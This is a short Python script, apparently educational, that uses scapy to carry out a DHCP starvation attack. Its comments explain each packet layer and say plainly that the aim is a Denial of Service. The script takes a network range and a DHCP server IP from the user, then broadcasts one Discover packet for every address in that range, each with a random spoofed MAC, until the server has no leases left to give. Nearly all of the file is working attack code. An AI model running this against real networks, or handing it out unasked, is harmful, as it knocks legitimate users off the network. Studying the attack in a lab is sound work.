# #!/usr/bin/python3
import scapy.all as scapy
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC, conf
from time import sleep
import ipaddress

# conf.checkIPaddr must = False
# Answer will only be accepted by scapy when it is set = False
# When conf.checkIPaddr is set = False, we do NOT need the IPs to be swapped to count as a response
conf.checkIPaddr = False
IPv4NetworkAddr = input('Enter network address with CIDR [192.168.2.1/23]: ')
dhcp_IP = input('Enter DHCP Server IP [192.168.2.70]: ')
possible_ips = [str(ip) for ip in ipaddress.IPv4Network(IPv4NetworkAddr)]

# Create a DHCP starvation attack
# Create packets with unique bogus MAC addr & use them to ask for IP Addresses
# This will lead to a Denial of Service (DoS) attack as 
# the DHCP server will NOT be able to lease IP
for ip_addr in possible_ips:
    # RandMAC() creates random MAC addresses
    bog_src_mac = RandMAC()
    # Build DHCP Discover Packet
    # We need to send a packet that broadcasts random MAC addresses
    # We assign the bogus MAC addr as srcMACaddr
    broadcast = Ether(src=bog_src_mac, dst='ff:ff:ff:ff:ff:ff')
    ip = IP(src='0.0.0.0', dst='255.255.255.255')
    
    # For UDP -> sport = randomPort of origin -> Server sends DHCP messages to UPD port 68 (used for DHCP client / Bootstrap Protocol Client)
    # For UDP -> dport = dstPort -> Client sends DHCP messages to UDP port 67 (used for DHCP Server / Bootstrap Protocol Server)
    udp = UDP(sport=68, dport=67)
    # The opcode of 1 says that it is a boot request
    # The client hardware addr is assigned a random MAC addr
    # BootP = predecessor of DHCP
    bootp = BOOTP(op=1, chaddr=bog_src_mac)
    # We want to send a DHCP discover message
    # This packet will ask for an IP addr from DHCP Server 
    dhcp = DHCP(options=[('message-type', 'discover'), ('requested_addr', ip_addr), ('server-id', dhcp_IP), ('end')])
    
    # Crafting the packet
    pkt = broadcast / ip /udp / bootp / dhcp
    
    # The DHCP operates on OSI Layer2, thus we should use sendp to send to segment
    sendp(pkt, iface='eth0', verbose=0)
    # Send out a new packet every 0.1 sec
    sleep(0.1)
    print(f'Sending packet - {ip_addr}')